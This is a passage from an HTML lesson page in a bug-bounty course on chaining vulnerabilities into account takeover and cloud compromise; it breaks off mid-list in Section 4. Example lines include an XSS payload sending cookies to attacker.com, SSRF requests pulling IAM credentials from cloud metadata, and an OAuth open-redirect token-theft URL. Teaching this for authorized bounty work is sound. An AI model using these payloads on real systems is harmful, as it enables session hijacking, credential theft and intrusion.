@@ -1,0 +1,1125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <!-- Access Control -->
+    <script src="../../../../components/AccessGuard.js"></script>
+    <script>AccessGuard.require('dark-arts');</script>
+    <!-- Progress & Achievements -->
+    <script src="../../../../components/AchievementManager.js"></script>
+    <script src="../../../../components/ModuleProgress.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Module 19: Bug Chaining &amp; Escalation - Bug Hunting</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { min-height: 100vh; background: #0a0508; font-family: 'Georgia', 'Times New Roman', serif; color: #8a6a9a; line-height: 1.7; overflow-x: hidden; }
+        body::before { content: ''; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: radial-gradient(ellipse at 15% 40%, rgba(80, 40, 100, 0.08) 0%, transparent 50%), radial-gradient(ellipse at 85% 60%, rgba(60, 20, 80, 0.06) 0%, transparent 50%); pointer-events: none; z-index: 0; }
+        .scroll-progress { position: fixed; top: 0; left: 0; height: 3px; background: linear-gradient(90deg, #9333ea, #a855f7); z-index: 200; transition: width 0.1s linear; width: 0%; }
+        .module-header { background: rgba(10, 5, 15, 0.95); border-bottom: 1px solid rgba(100, 60, 130, 0.2); padding: 18px 40px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; backdrop-filter: blur(10px); }
+        .header-left { display: flex; align-items: center; gap: 15px; }
+        .back-btn { background: rgba(80, 40, 100, 0.2); border: 1px solid rgba(100, 60, 130, 0.3); color: #9a7aaa; padding: 7px 14px; border-radius: 4px; font-size: 0.8rem; text-decoration: none; transition: all 0.3s ease; font-family: 'Georgia', serif; }
+        .back-btn:hover { background: rgba(100, 60, 130, 0.3); border-color: rgba(147, 51, 234, 0.5); color: #c4a0d8; }
+        .module-label { font-size: 0.75rem; color: #6a4a7a; letter-spacing: 0.2em; text-transform: uppercase; }
+        .header-right { display: flex; align-items: center; gap: 12px; font-size: 0.75rem; color: #6a4a7a; }
+        .progress-bar-mini { width: 120px; height: 4px; background: rgba(60, 30, 80, 0.3); border-radius: 2px; overflow: hidden; }
+        .progress-bar-mini .fill { height: 100%; background: linear-gradient(90deg, #9333ea, #a855f7); width: 0%; transition: width 0.5s ease; }
+        .module-content { max-width: 1100px; margin: 0 auto; padding: 40px; position: relative; z-index: 10; }
+        .intro-section { text-align: center; padding: 50px 0 60px; }
+        .intro-icon { font-size: 3.5rem; margin-bottom: 20px; filter: drop-shadow(0 0 20px rgba(147, 51, 234, 0.3)); }
+        .intro-title { font-size: 2.4rem; color: #c4a0d8; margin-bottom: 12px; font-weight: 400; letter-spacing: 0.05em; }
+        .intro-meta { font-size: 0.75rem; color: #6a4a7a; letter-spacing: 0.25em; text-transform: uppercase; margin-bottom: 20px; }
+        .intro-subtitle { font-size: 1rem; color: #8a6a9a; max-width: 720px; margin: 0 auto; line-height: 1.8; }
+        .module-stats { display: flex; justify-content: center; gap: 25px; margin-top: 30px; flex-wrap: wrap; }
+        .stat-pill { padding: 8px 18px; background: rgba(60, 30, 80, 0.15); border: 1px solid rgba(100, 60, 130, 0.2); border-radius: 20px; font-size: 0.75rem; color: #7a5a8a; letter-spacing: 0.1em; }
+        .section { margin-bottom: 80px; opacity: 0; transform: translateY(30px); transition: opacity 0.6s ease, transform 0.6s ease; }
+        .section.visible { opacity: 1; transform: translateY(0); }
+        .section-number { font-size: 0.65rem; color: #6a4a7a; letter-spacing: 0.35em; text-transform: uppercase; margin-bottom: 8px; }
+        .section-title { font-size: 1.9rem; color: #c4a0d8; margin-bottom: 20px; font-weight: 400; display: flex; align-items: center; gap: 15px; border-bottom: 1px solid rgba(100, 60, 130, 0.15); padding-bottom: 15px; }
+        .section-icon { font-size: 1.6rem; opacity: 0.75; }
+        .section-body { color: #a080b0; font-size: 0.97rem; }
+        .section-body p { margin-bottom: 16px; }
+        .section-body ul { list-style: none; padding-left: 20px; margin-bottom: 16px; }
+        .section-body li { margin-bottom: 10px; position: relative; padding-left: 20px; }
+        .section-body li::before { content: '\25B8'; position: absolute; left: 0; color: #7a5a8a; }
+        .standards-table { width: 100%; border-collapse: collapse; margin: 24px 0; font-size: 0.87rem; }
+        .standards-table th { background: rgba(40, 20, 60, 0.5); color: #c4a0d8; padding: 12px 16px; text-align: left; font-weight: normal; letter-spacing: 0.1em; font-size: 0.78rem; text-transform: uppercase; border-bottom: 1px solid rgba(100, 60, 130, 0.2); }
+        .standards-table td { padding: 12px 16px; color: #9a7aaa; border-bottom: 1px solid rgba(100, 60, 130, 0.08); vertical-align: top; }
+        .standards-table tr:hover td { background: rgba(40, 20, 60, 0.2); }
+        .standards-table .std-name { color: #c4a0d8; font-family: 'Courier New', monospace; font-size: 0.9rem; }
+        .badge { display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 0.65rem; letter-spacing: 0.08em; text-transform: uppercase; }
+        .badge-legacy { background: rgba(239, 68, 68, 0.15); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.3); }
+        .badge-current { background: rgba(34, 197, 94, 0.15); color: #4ade80; border: 1px solid rgba(34, 197, 94, 0.3); }
+        .badge-latest { background: rgba(147, 51, 234, 0.2); color: #c084fc; border: 1px solid rgba(147, 51, 234, 0.3); }
+        .badge-info { background: rgba(59, 130, 246, 0.15); color: #93c5fd; border: 1px solid rgba(59, 130, 246, 0.3); }
+        .concept-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 18px; margin: 28px 0; }
+        .concept-card { background: rgba(15, 8, 20, 0.6); border: 1px solid rgba(100, 60, 130, 0.15); border-radius: 8px; padding: 22px; transition: all 0.3s ease; }
+        .concept-card:hover { transform: translateY(-4px); border-color: rgba(147, 51, 234, 0.35); box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3); }
+        .concept-card-icon { font-size: 1.8rem; margin-bottom: 12px; }
+        .concept-card-title { font-size: 1rem; color: #c4a0d8; margin-bottom: 8px; }
+        .concept-card-body { font-size: 0.85rem; color: #8a6a9a; line-height: 1.6; }
+        .callout { border-radius: 8px; padding: 20px 24px; margin: 24px 0; display: flex; gap: 16px; align-items: flex-start; }
+        .callout-info { background: rgba(40, 20, 60, 0.4); border-left: 3px solid #9333ea; }
+        .callout-warning { background: rgba(60, 40, 10, 0.4); border-left: 3px solid #ca8a04; }
+        .callout-danger { background: rgba(60, 20, 20, 0.4); border-left: 3px solid #dc2626; }
+        .callout-tip { background: rgba(20, 50, 30, 0.4); border-left: 3px solid #16a34a; }
+        .callout-icon { font-size: 1.3rem; flex-shrink: 0; margin-top: 1px; }
+        .callout-title { font-size: 0.8rem; letter-spacing: 0.15em; text-transform: uppercase; margin-bottom: 6px; }
+        .callout-info .callout-title { color: #a855f7; }
+        .callout-warning .callout-title { color: #eab308; }
+        .callout-danger .callout-title { color: #ef4444; }
+        .callout-tip .callout-title { color: #22c55e; }
+        .callout-text { font-size: 0.9rem; color: #9a7aaa; line-height: 1.65; }
+        .code-block { background: rgba(5, 2, 10, 0.8); border: 1px solid rgba(100, 60, 130, 0.2); border-radius: 6px; padding: 16px 20px; margin: 16px 0; font-family: 'Courier New', monospace; font-size: 0.84rem; color: #b090c0; overflow-x: auto; line-height: 1.6; white-space: pre-wrap; }
+        .code-block .kw { color: #a855f7; } .code-block .str { color: #86efac; } .code-block .comment { color: #6a4a7a; font-style: italic; } .code-block .flag { color: #fbbf24; } .code-block .cmd { color: #c4a0d8; }
+        .two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin: 20px 0; }
+        .col-card { background: rgba(15, 8, 20, 0.6); border: 1px solid rgba(100, 60, 130, 0.15); border-radius: 8px; padding: 22px; }
+        .col-card h3 { font-size: 1rem; color: #c4a0d8; margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }
+        .col-card ul { list-style: none; padding: 0; }
+        .col-card li { font-size: 0.88rem; color: #8a6a9a; padding: 6px 0; border-bottom: 1px solid rgba(100, 60, 130, 0.08); display: flex; align-items: flex-start; gap: 8px; }
+        .col-card li:last-child { border-bottom: none; }
+        .li-marker { color: #9333ea; flex-shrink: 0; }
+        .numbered-list { list-style: none; padding: 0; margin: 20px 0; counter-reset: step-counter; }
+        .numbered-list li { counter-increment: step-counter; padding: 12px 18px 12px 50px; margin-bottom: 8px; background: rgba(15, 8, 20, 0.5); border: 1px solid rgba(100, 60, 130, 0.12); border-radius: 6px; position: relative; font-size: 0.9rem; color: #9a7aaa; line-height: 1.6; }
+        .numbered-list li::before { content: counter(step-counter, decimal-leading-zero); position: absolute; left: 16px; top: 12px; font-family: 'Courier New', monospace; font-size: 0.8rem; color: #9333ea; font-weight: bold; }
+        .discussion-section { background: linear-gradient(135deg, rgba(40, 20, 60, 0.3), rgba(30, 15, 50, 0.4)); border: 1px solid rgba(100, 60, 130, 0.25); border-radius: 10px; padding: 30px; margin: 40px 0; }
+        .discussion-title { font-size: 1.1rem; color: #c4a0d8; margin-bottom: 20px; display: flex; align-items: center; gap: 10px; }
+        .prompt-list { list-style: none; padding: 0; }
+        .prompt-item { padding: 14px 18px; background: rgba(15, 8, 20, 0.5); border: 1px solid rgba(100, 60, 130, 0.12); border-radius: 6px; margin-bottom: 10px; font-size: 0.9rem; color: #9a7aaa; line-height: 1.6; display: flex; gap: 12px; }
+        .prompt-num { color: #9333ea; font-size: 0.8rem; font-family: 'Courier New', monospace; flex-shrink: 0; padding-top: 2px; }
+        .detail-section { border: 1px solid rgba(100, 60, 130, 0.15); border-radius: 8px; margin: 12px 0; overflow: hidden; }
+        .detail-header { padding: 16px 20px; background: rgba(15, 8, 20, 0.6); cursor: pointer; display: flex; justify-content: space-between; align-items: center; transition: background 0.3s ease; user-select: none; }
+        .detail-header:hover { background: rgba(40, 20, 60, 0.5); }
+        .detail-header-left { display: flex; align-items: center; gap: 12px; }
+        .detail-header-icon { font-size: 1rem; opacity: 0.75; }
+        .detail-header-title { font-size: 0.95rem; color: #c4a0d8; }
+        .detail-header-subtitle { font-size: 0.75rem; color: #6a4a7a; margin-top: 2px; }
+        .detail-toggle { color: #7a5a8a; font-size: 0.8rem; transition: transform 0.3s ease; }
+        .detail-toggle.open { transform: rotate(180deg); }
+        .detail-body { display: none; padding: 20px 24px; background: rgba(10, 5, 15, 0.4); border-top: 1px solid rgba(100, 60, 130, 0.1); color: #9a7aaa; font-size: 0.9rem; line-height: 1.7; }
+        .detail-body.open { display: block; }
+        .detail-body p { margin-bottom: 12px; }
+        .detail-body ul { list-style: none; padding-left: 20px; }
+        .detail-body li { margin-bottom: 8px; position: relative; padding-left: 18px; }
+        .detail-body li::before { content: '\25B8'; position: absolute; left: 0; color: #7a5a8a; }
+        .tool-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 16px; margin: 20px 0; }
+        .tool-card { background: rgba(15, 8, 20, 0.6); border: 1px solid rgba(100, 60, 130, 0.15); border-radius: 8px; padding: 20px; transition: all 0.3s ease; }
+        .tool-card:hover { border-color: rgba(147, 51, 234, 0.3); }
+        .tool-name { font-size: 0.95rem; color: #c4a0d8; margin-bottom: 4px; font-family: 'Courier New', monospace; }
+        .tool-role { font-size: 0.68rem; color: #9333ea; letter-spacing: 0.12em; text-transform: uppercase; margin-bottom: 10px; }
+        .tool-desc { font-size: 0.84rem; color: #8a6a9a; line-height: 1.6; }
+        .completion-section { text-align: center; padding: 60px 40px; background: linear-gradient(135deg, rgba(40, 20, 60, 0.3), rgba(30, 15, 50, 0.4)); border: 1px solid rgba(100, 60, 130, 0.3); border-radius: 12px; margin: 60px 0 40px; }
+        .completion-icon { font-size: 3.5rem; margin-bottom: 20px; }
+        .completion-title { font-size: 1.8rem; color: #c4a0d8; margin-bottom: 12px; font-weight: 400; }
+        .completion-text { color: #8a6a9a; font-size: 0.95rem; max-width: 560px; margin: 0 auto 30px; line-height: 1.8; }
+        .completion-btn { display: inline-flex; align-items: center; gap: 10px; padding: 14px 36px; background: linear-gradient(135deg, #7c3aed, #9333ea); border: none; border-radius: 8px; color: #f3e8ff; font-size: 1rem; cursor: pointer; font-family: 'Georgia', serif; letter-spacing: 0.05em; transition: all 0.3s ease; box-shadow: 0 4px 20px rgba(147, 51, 234, 0.3); }
+        .completion-btn:hover { background: linear-gradient(135deg, #6d28d9, #7c3aed); box-shadow: 0 6px 30px rgba(147, 51, 234, 0.45); transform: translateY(-2px); }
+        @media (max-width: 768px) { .module-header { padding: 15px 20px; } .module-content { padding: 20px; } .two-col { grid-template-columns: 1fr; } .concept-grid { grid-template-columns: 1fr; } .tool-grid { grid-template-columns: 1fr; } .intro-title { font-size: 1.8rem; } .section-title { font-size: 1.4rem; } }
+    </style>
+</head>
+<body>
+
+<div class="scroll-progress" id="scrollProgress"></div>
+
+<header class="module-header">
+    <div class="header-left">
+        <a href="../index.html" class="back-btn">&#8592; Back to Course</a>
+        <div>
+            <div class="module-label">BH // Bug Hunting &middot; Module 19</div>
+        </div>
+    </div>
+    <div class="header-right">
+        <span>Reading Progress</span>
+        <div class="progress-bar-mini">
+            <div class="fill" id="readingFill"></div>
+        </div>
+    </div>
+</header>
+
+<main class="module-content">
+
+    <!-- Hero -->
+    <div class="intro-section">
+        <div class="intro-icon">&#128279;</div>
+        <h1 class="intro-title">Bug Chaining &amp; Escalation</h1>
+        <div class="intro-meta">Bug Hunting &bull; Module 19 &bull; Mastery Track</div>
+        <p class="intro-subtitle">
+            A single medium-severity bug pays a modest bounty. But when you chain that medium with
+            two other findings into a full account takeover, the payout can multiply tenfold. Bug
+            chaining is the art of combining individually low-impact vulnerabilities into attack
+            sequences that demonstrate critical business impact. This is where experienced hunters
+            separate themselves from beginners &mdash; not by finding different bugs, but by
+            demonstrating what those bugs mean together.
+        </p>
+        <div class="module-stats">
+            <div class="stat-pill">Chain Patterns</div>
+            <div class="stat-pill">Impact Amplification</div>
+            <div class="stat-pill">Multi-Step Exploitation</div>
+            <div class="stat-pill">Bounty Maximization</div>
+            <div class="stat-pill">~25 min read</div>
+        </div>
+    </div>
+
+    <!-- Section 1: Why Chaining Matters -->
+    <div class="section" id="s1">
+        <div class="section-number">Section 01</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128176;</span>
+            Why Chaining Matters
+        </h2>
+        <div class="section-body">
+            <p>
+                Most vulnerabilities found during bug bounty research are not critical in isolation.
+                An open redirect is informational. A self-XSS is out of scope. An IDOR that leaks
+                non-sensitive metadata is a low. Individually, these findings generate small payouts
+                or no payout at all. But vulnerabilities do not exist in isolation &mdash; they exist
+                within the context of an application's complete functionality, authentication system,
+                and business logic. When you demonstrate how multiple weaknesses combine to create a
+                critical attack path, you are no longer reporting isolated bugs. You are demonstrating
+                real-world attack scenarios.
+            </p>
+
+            <h3 style="color:#c4a0d8; font-size:1rem; margin:24px 0 12px; font-weight:400;">The Economics of Chaining</h3>
+
+            <p>
+                Consider the math. A typical bug bounty program might pay:
+            </p>
+
+            <table class="standards-table">
+                <thead>
+                    <tr>
+                        <th>Severity</th>
+                        <th>Individual Payout</th>
+                        <th>Example</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><span class="badge badge-info">Informational</span></td>
+                        <td>$0 - $100</td>
+                        <td>Open redirect, verbose error messages</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge badge-current">Low</span></td>
+                        <td>$100 - $500</td>
+                        <td>Self-XSS, CSRF on non-sensitive action</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge badge-latest">Medium</span></td>
+                        <td>$500 - $2,000</td>
+                        <td>Stored XSS, IDOR on non-critical data</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge badge-legacy">Critical</span></td>
+                        <td>$5,000 - $25,000+</td>
+                        <td>Account takeover, RCE, mass data exposure</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <p>
+                Three medium findings reported separately: $500 + $500 + $500 = $1,500. Those same
+                three findings chained into a demonstrated account takeover: $10,000 or more. The
+                bugs are identical. The difference is presentation and proof of impact. Programs
+                reward chains at higher severity because the chain represents the actual risk to their
+                business, not the theoretical severity of each component.
+            </p>
+
+            <h3 style="color:#c4a0d8; font-size:1rem; margin:24px 0 12px; font-weight:400;">How Platforms Evaluate Chains</h3>
+
+            <p>
+                When a triager receives a chain report, they evaluate it based on the cumulative
+                impact of the complete attack sequence, not the severity of individual components.
+                The key factors are:
+            </p>
+
+            <ul>
+                <li><strong style="color:#c4a0d8;">End-state impact.</strong> What can the attacker ultimately achieve? Account takeover, data exfiltration, privilege escalation, and remote code execution are the highest-impact end states.</li>
+                <li><strong style="color:#c4a0d8;">Attack complexity.</strong> How many steps does the chain require? Does it need user interaction? Can it be automated? A five-step chain that requires the victim to click a link is still critical if the end result is account takeover.</li>
+                <li><strong style="color:#c4a0d8;">Preconditions.</strong> Does the attacker need an authenticated account? Network access? Specific timing? Fewer preconditions mean higher severity.</li>
+                <li><strong style="color:#c4a0d8;">Blast radius.</strong> Does the chain affect one user, all users, or the entire system? A chain that can be replayed against any user is significantly more severe than one targeting a specific account.</li>
+            </ul>
+
+            <div class="callout callout-info">
+                <span class="callout-icon">&#8505;</span>
+                <div class="callout-content">
+                    <div class="callout-title">Impact-Driven Thinking</div>
+                    <div class="callout-text">
+                        The fundamental shift in mindset is this: stop asking "what vulnerability class
+                        is this?" and start asking "what can I do with this?" A reflected XSS is a medium.
+                        A reflected XSS that steals an OAuth token from a callback URL, which grants
+                        access to the admin panel, which allows modification of all user accounts &mdash;
+                        that is a critical. The vulnerability class did not change. The demonstrated
+                        impact did.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 2: Common Chain Patterns -->
+    <div class="section" id="s2">
+        <div class="section-number">Section 02</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128268;</span>
+            Common Chain Patterns
+        </h2>
+        <div class="section-body">
+            <p>
+                While every chain is unique to the application it targets, certain patterns appear
+                repeatedly across bug bounty programs. Learning these patterns gives you a mental
+                framework for recognizing chain opportunities when you encounter individual bugs
+                during testing.
+            </p>
+
+            <h3 style="color:#c4a0d8; font-size:1rem; margin:24px 0 12px; font-weight:400;">Pattern 1: IDOR + XSS = Account Takeover</h3>
+
+            <p>
+                An IDOR that leaks a user's email address combined with an XSS that can steal
+                session tokens creates a full account takeover chain. The IDOR provides the target's
+                information (identifying which accounts to attack), and the XSS provides the mechanism
+                to hijack their session. Neither bug alone is critical, but together they allow an
+                attacker to take over any account on the platform.
+            </p>
+
+            <div class="code-block"><span class="comment">// Step 1: IDOR leaks user data</span>
+<span class="kw">GET</span> <span class="str">/api/users/12345/settings</span> HTTP/2
+<span class="comment">// Response: {"email":"victim@corp.com","role":"admin","api_key":"sk_live_..."}</span>
+
+<span class="comment">// Step 2: XSS steals session via crafted link sent to the admin</span>
+<span class="str">https://app.target.com/search?q=</span><span class="flag">&lt;script&gt;fetch('https://attacker.com/steal?c='+document.cookie)&lt;/script&gt;</span>
+
+<span class="comment">// Step 3: Attacker uses stolen session to access admin panel</span>
+<span class="comment">// Impact: Full account takeover of admin user with leaked API key</span></div>
+
+            <h3 style="color:#c4a0d8; font-size:1rem; margin:24px 0 12px; font-weight:400;">Pattern 2: SSRF + Cloud Metadata = RCE</h3>
+
+            <p>
+                A Server-Side Request Forgery that can reach the cloud metadata endpoint
+                (<code style="color:#86efac;">169.254.169.254</code>) can retrieve IAM role credentials.
+                If those credentials have broad permissions (common in misconfigured AWS environments),
+                the attacker can access S3 buckets, modify Lambda functions, or spin up EC2 instances &mdash;
+                effectively achieving remote code execution through the cloud control plane.
+            </p>
+
+            <div class="code-block"><span class="comment">// Step 1: SSRF via image URL parameter</span>
+<span class="kw">POST</span> <span class="str">/api/fetch-preview</span> HTTP/2
+Content-Type: application/json
+
+{"url": "<span class="flag">http://169.254.169.254/latest/meta-data/iam/security-credentials/</span>"}
+<span class="comment">// Response reveals IAM role name: "webapp-prod-role"</span>
+
+<span class="comment">// Step 2: Retrieve temporary credentials</span>
+{"url": "<span class="flag">http://169.254.169.254/latest/meta-data/iam/security-credentials/webapp-prod-role</span>"}
+<span class="comment">// Response: AccessKeyId, SecretAccessKey, Token</span>
+
+<span class="comment">// Step 3: Use credentials to access AWS resources</span>
+<span class="cmd">aws</span> <span class="str">s3 ls</span> <span class="flag">--profile stolen-creds</span>
+<span class="cmd">aws</span> <span class="str">lambda update-function-code</span> <span class="flag">--function-name prod-api ...</span>
+<span class="comment">// Impact: Full cloud infrastructure compromise via SSRF</span></div>
+
+            <h3 style="color:#c4a0d8; font-size:1rem; margin:24px 0 12px; font-weight:400;">Pattern 3: Open Redirect + OAuth = Token Theft</h3>
+
+            <p>
+                OAuth implementations validate the redirect URI to prevent authorization codes and tokens
+                from being sent to attacker-controlled servers. But if the application has an open redirect
+                on an allowed domain, the attacker can chain it: the OAuth flow redirects to the legitimate
+                domain, which then redirects (with the token in the URL fragment or query string) to the
+                attacker's server.
+            </p>
+
+            <div class="code-block"><span class="comment">// Step 1: Find open redirect</span>
+<span class="str">https://app.target.com/redirect?url=https://attacker.com</span>
+<span class="comment">// Confirmed: 302 redirect to attacker.com</span>
+
+<span class="comment">// Step 2: Chain with OAuth authorization flow</span>
+<span class="str">https://accounts.google.com/o/oauth2/auth?</span>
+  <span class="flag">client_id</span>=TARGET_CLIENT_ID&amp;
+  <span class="flag">redirect_uri</span>=https://app.target.com/redirect?url=https://attacker.com&amp;
+  <span class="flag">response_type</span>=code&amp;
+  <span class="flag">scope</span>=openid email profile
+
+<span class="comment">// Step 3: Victim clicks link, authenticates with Google</span>
+<span class="comment">// Google redirects to: https://app.target.com/redirect?url=https://attacker.com&amp;code=AUTH_CODE</span>
+<span class="comment">// App redirects to: https://attacker.com&amp;code=AUTH_CODE</span>
+<span class="comment">// Attacker exchanges code for access token</span>
+<span class="comment">// Impact: Full OAuth account takeover</span></div>
+
+            <h3 style="color:#c4a0d8; font-size:1rem; margin:24px 0 12px; font-weight:400;">Pattern 4: Info Disclosure + CSRF = Privilege Escalation</h3>
+
+            <p>
+                An information disclosure that reveals a CSRF token or API key combined with a CSRF
+                vulnerability on a privilege-changing endpoint creates a privilege escalation chain.
+                The info disclosure provides the secret needed to bypass CSRF protections, and the
+                CSRF allows the attacker to perform actions as the victim.
+            </p>
+
+            <h3 style="color:#c4a0d8; font-size:1rem; margin:24px 0 12px; font-weight:400;">Pattern 5: Self-XSS + CSRF = Stored XSS</h3>
+
+            <p>
+                Self-XSS (XSS that only executes in your own session) is typically out of scope because
+                it requires the victim to paste malicious code into their own browser. But when combined
+                with a CSRF vulnerability, the attacker can force the victim's browser to submit the
+                XSS payload into the victim's own profile or settings, converting a self-XSS into a
+                stored XSS that fires when anyone views the victim's profile.
+            </p>
+
+            <div class="concept-grid">
+                <div class="concept-card">
+                    <div class="concept-card-title">More Chain Templates</div>
+                    <div class="concept-card-body">
+                        <strong style="color:#c4a0d8;">Race Condition + IDOR:</strong> Exploit a time-of-check-to-time-of-use
+                        gap to access resources during a brief window where authorization is not enforced.
+                        <br><br>
+                        <strong style="color:#c4a0d8;">Subdomain Takeover + Cookie Scope:</strong> Claim an abandoned
+                        subdomain, set cookies scoped to the parent domain, and hijack sessions on the
+                        main application.
+                        <br><br>
+                        <strong style="color:#c4a0d8;">CORS Misconfiguration + Sensitive Data:</strong> A permissive
+                        CORS policy on an endpoint that returns PII enables cross-origin data theft from
+                        any website the victim visits.
+                    </div>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-title">Recognizing Chain Opportunities</div>
+                    <div class="concept-card-body">
+                        When you find any individual bug, ask these questions before reporting:
+                        <br><br>
+                        Can this bug leak data that enables another attack?
+                        <br><br>
+                        Can this bug bypass a protection that blocks another attack?
+                        <br><br>
+                        Can this bug be combined with a known out-of-scope issue to create an in-scope chain?
+                        <br><br>
+                        What is the worst-case outcome if I chain this with everything else I know about the target?
+                    </div>
+                </div>
+            </div>
+
+            <div class="callout callout-warning">
+                <span class="callout-icon">&#9888;</span>
+                <div class="callout-content">
+                    <div class="callout-title">Do Not Force Chains</div>
+                    <div class="callout-text">
+                        Not every bug needs to be part of a chain. If you have a clear, high-severity
+                        finding, report it on its own. Chains are most valuable when the individual
+                        components would be low or medium severity on their own. Trying to artificially
+                        inflate a finding by adding unnecessary chain steps will annoy triagers and can
+                        lead to downgraded ratings.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 3: Impact Amplification -->
+    <div class="section" id="s3">
+        <div class="section-number">Section 03</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128200;</span>
+            Impact Amplification
+        </h2>
+        <div class="section-body">
+            <p>
+                Impact amplification is the practice of taking a finding and demonstrating the maximum
+                realistic damage an attacker could achieve with it. This is different from chaining
+                because you are working with a single vulnerability &mdash; but you are exploring its
+                full implications rather than accepting the surface-level impact.
+            </p>
+
+            <h3 style="color:#c4a0d8; font-size:1rem; margin:24px 0 12px; font-weight:400;">Turning Informational Into High</h3>
+
+            <p>
+                Many informational findings become high-severity when you demonstrate their downstream
+                consequences. Consider these escalation paths:
+            </p>
+
+            <div class="concept-grid">
+                <div class="concept-card">
+                    <div class="concept-card-title">Exposed .git Directory</div>
+                    <div class="concept-card-body">
+                        On its own: informational. After reconstruction: you have the complete source
+                        code including database credentials, API keys, internal endpoint documentation,
+                        and deployment scripts. Report the .git exposure with a demonstration of what
+                        the reconstructed source reveals &mdash; hardcoded secrets and internal architecture.
+                    </div>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-title">Verbose Error Messages</div>
+                    <div class="concept-card-body">
+                        A stack trace that reveals the database type, ORM version, internal file paths,
+                        and table structure is informational. But if you use that information to craft
+                        a targeted SQL injection that the error message's details made possible, the
+                        error message becomes a critical enabler. Include both the information disclosure
+                        and the exploitation it enabled.
+                    </div>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-title">Email Address Enumeration</div>
+                    <div class="concept-card-body">
+                        Login forms that distinguish between "user not found" and "wrong password" are
+                        a low finding. But demonstrate that the enumerated emails can be used for
+                        credential stuffing (cross-reference with breach databases), targeted phishing
+                        (corporate emails in a B2B application), or account takeover via password reset
+                        flow analysis &mdash; the impact compounds.
+                    </div>
+                </div>
+            </div>
+
+            <h3 style="color:#c4a0d8; font-size:1rem; margin:24px 0 12px; font-weight:400;">Demonstrating Business Impact</h3>
+
+            <p>
+                Triagers and security teams respond to business impact, not technical jargon. Frame
+                your findings in terms the business cares about:
+            </p>
+
+            <div class="two-col">
+                <div class="col-card">
+                    <h3><span class="li-marker">&#9654;</span> Technical Description</h3>
+                    <ul>
+                        <li><span class="li-marker">&#8226;</span> "IDOR on GET /api/invoices/{id}"</li>
+                        <li><span class="li-marker">&#8226;</span> "Reflected XSS via search parameter"</li>
+                        <li><span class="li-marker">&#8226;</span> "SSRF via PDF generation feature"</li>
+                        <li><span class="li-marker">&#8226;</span> "Missing rate limit on login endpoint"</li>
+                    </ul>
+                </div>
+                <div class="col-card">
+                    <h3><span class="li-marker">&#9654;</span> Business Impact Framing</h3>
+                    <ul>
+                        <li><span class="li-marker">&#8226;</span> "Any user can download any customer's invoices, exposing billing data for all 50,000 accounts"</li>
+                        <li><span class="li-marker">&#8226;</span> "An attacker can steal admin session tokens, gaining access to the full customer management panel"</li>
+                        <li><span class="li-marker">&#8226;</span> "Internal network scanning reveals 3 internal services including the production database"</li>
+                        <li><span class="li-marker">&#8226;</span> "Brute-force attack can compromise accounts at 10,000 attempts/minute with no lockout"</li>
+                    </ul>
+                </div>
+            </div>
+
+            <h3 style="color:#c4a0d8; font-size:1rem; margin:24px 0 12px; font-weight:400;">PII Exposure Amplification</h3>
+
+            <p>
+                When a vulnerability exposes personally identifiable information, the severity depends
+                on the type and volume of data exposed. An IDOR that leaks usernames is low. The same
+                IDOR that also leaks email addresses, phone numbers, physical addresses, and payment
+                card last-four digits is high. And if the IDOR is iterable (sequential IDs that can
+                be enumerated programmatically), the exposure scales to the entire user base, pushing
+                the severity to critical.
+            </p>
+
+            <p>
+                When reporting PII exposure, always enumerate exactly what data types are accessible
+                and estimate the total number of affected records. "Affects approximately 2.3 million
+                user records" carries far more weight than "affects multiple users." You can estimate
+                the record count by checking the highest valid user ID without actually accessing
+                more than a handful of records for your proof of concept.
+            </p>
+
+            <div class="callout callout-tip">
+                <span class="callout-icon">&#10003;</span>
+                <div class="callout-content">
+                    <div class="callout-title">Regulatory Implications Add Weight</div>
+                    <div class="callout-text">
+                        When a finding would trigger regulatory notification requirements, mention it.
+                        "This vulnerability exposes health data subject to HIPAA" or "This endpoint
+                        leaks EU user data in violation of GDPR Article 32" signals to the security team
+                        that remediation is not optional &mdash; it is a legal requirement. Regulatory
+                        context transforms a technical finding into a compliance incident, which
+                        accelerates remediation and often increases the bounty.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 4: Multi-Step Exploitation -->
+    <div class="section" id="s4">
+        <div class="section-number">Section 04</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128296;</span>
+            Multi-Step Exploitation
+        </h2>
+        <div class="section-body">
+            <p>
+                A chain report must tell a story. The triager reading it needs to follow the attack
+                from beginning to end, understanding why each step is necessary and how it enables
+                the next. Multi-step exploitation is as much about communication as it is about
+                technical skill. A brilliant chain that is poorly documented will be downgraded or
+                rejected.
+            </p>
+
+            <h3 style="color:#c4a0d8; font-size:1rem; margin:24px 0 12px; font-weight:400;">Building the Exploitation Narrative</h3>
+
+            <p>
+                Structure your chain as a numbered sequence where each step has a clear purpose and
+                a clear output that feeds into the next step:
+            </p>
+
+            <ol class="numbered-list">
